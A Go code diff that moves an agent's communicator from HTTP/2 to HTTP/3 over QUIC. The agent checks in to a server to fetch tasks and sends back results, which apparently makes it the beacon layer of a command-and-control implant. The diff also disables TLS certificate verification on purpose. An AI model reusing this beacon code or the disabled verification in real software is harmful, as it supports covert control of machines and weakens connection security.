@@ -4,6 +4,8 @@ import (
 	"bytes"
 	"crypto/tls"
 	"fmt"
+	"github.com/quic-go/quic-go"
+	"github.com/quic-go/quic-go/http3"
 	"io"
 	"log"
 	"net/http"
@@ -25,22 +27,36 @@ func NewHttp3Communicator(cfg config.AgentConfig) (*Http3Communicator, error) {
 		return nil, err
 	}
 
-	log.Printf("|COMM INIT|-> Initializing HTTP/2 TLS Communicator for %s:%s%s", cfg.ServerIP, cfg.ServerPort, cfg.CheckInEndpoint)
+	log.Printf("|COMM INIT|-> Initializing HTTP/3 Communicator for %s:%s%s", cfg.ServerIP, cfg.ServerPort, cfg.CheckInEndpoint)
 
+	// --- Configure TLS for QUIC/HTTP3 ---
+	// QUIC requires TLS 1.3 and ALPN must include "h3".
 	tlsConfig := &tls.Config{
 		InsecureSkipVerify: true,
+		NextProtos:         []string{"h3"},   // MUST include "h3" for HTTP/3
+		MinVersion:         tls.VersionTLS13, // QUIC requires TLS 1.3
 	}
 
-	transport := &http.Transport{
-		TLSClientConfig:   tlsConfig,
-		ForceAttemptHTTP2: true,
+	log.Printf("|WARN COMM INIT H3| TLS certificate verification is DISABLED (TLSSkipVerify=true).")
+
+	// --- Create the HTTP/3 Transport ---
+	// This is the core transport mechanism provided by quic-go/http3.
+	// It is a long-lived object that manages connections.
+	transport := &http3.Transport{
+		TLSClientConfig: tlsConfig,
+		QUICConfig: &quic.Config{
+			// Optional: Add QUIC-specific config if needed.
+			// For example, to increase idle timeout:
+			// MaxIdleTimeout: 60 * time.Second,
+		},
+		// EnableDatagrams: false, // If you need QUIC datagram support
 	}
 
 	client := &http.Client{
 		Transport: transport,
 	}
 
-	return &Http2TLSCommunicator{
+	return &Http3Communicator{
 		agentConfig: cfg,
 		httpClient:  client,
 	}, nil
@@ -57,19 +73,24 @@ func BasicValidateH3(cfg config.AgentConfig) error {
 	return nil
 }
 
-func (c *Http2TLSCommunicator) Connect() error {
-	log.Printf("|COMM %s|-> Connect() called. Typically no-op for HTTP/1.1.", c.agentConfig.Protocol)
+// Connect is a no-op
+func (c *Http3Communicator) Connect() error {
+	log.Println("|COMM H3|-> Connect() called (no-op for H3/QUIC)")
 	return nil
 }
 
-func (c *Http2TLSCommunicator) Disconnect() error {
-	log.Printf("|COMM %s|-> Disconnect() called.", c.agentConfig.Protocol)
+// Disconnect is for cleanup logic.
+func (c *Http3Communicator) Disconnect(transport *http3.Transport) error {
+	log.Printf("|COMM CLEANUP|-> Closing H3 transport.")
+	if transport != nil {
+		return transport.Close()
+	}
 	return nil
 }
 
 // CheckIn performs a GET request to the CheckInEndpoint to fetch tasks.
 // Returns the raw response body which might contain tasking information.
-func (c *Http2TLSCommunicator) CheckIn() ([]byte, error) {
+func (c *Http3Communicator) CheckIn() ([]byte, error) {
 	// CONSTRUCT THE TARGET URL
 	targetURL := url.URL{
 		Scheme: "https",
@@ -103,10 +124,9 @@ func (c *Http2TLSCommunicator) CheckIn() ([]byte, error) {
 	defer resp.Body.Close()
 
 	// --- VERIFY PROTOCOL ---
-	// Check if HTTP/2 was actually negotiated.
-	log.Printf("|COMM H2TLS|-> Check-in response: Status=%s, PROTOCOL=%s", resp.Status, resp.Proto)
-	if resp.ProtoMajor != 2 {
-		log.Printf("|WARN COMM H2TLS| Expected HTTP/2, but received %s!", resp.Proto)
+	log.Printf("|COMM H3|-> Check-in response: Status=%s, PROTOCOL=%s", resp.Status, resp.Proto)
+	if resp.Proto != "HTTP/3.0" { // Check for exact H3 string
+		log.Printf("|WARN COMM H3| Expected HTTP/3.0, but received %s!", resp.Proto)
 	}
 	// --- END VERIFY PROTOCOL ---
 
@@ -158,6 +178,6 @@ func (c *Http2TLSCommunicator) SendResult(resultData []byte) error {
 	return nil
 }
 
-func (c *Http2TLSCommunicator) Type() config.AgentProtocol {
-	return config.HTTP1Clear
+func (c *Http3Communicator) Type() config.AgentProtocol {
+	return config.HTTP3
 }
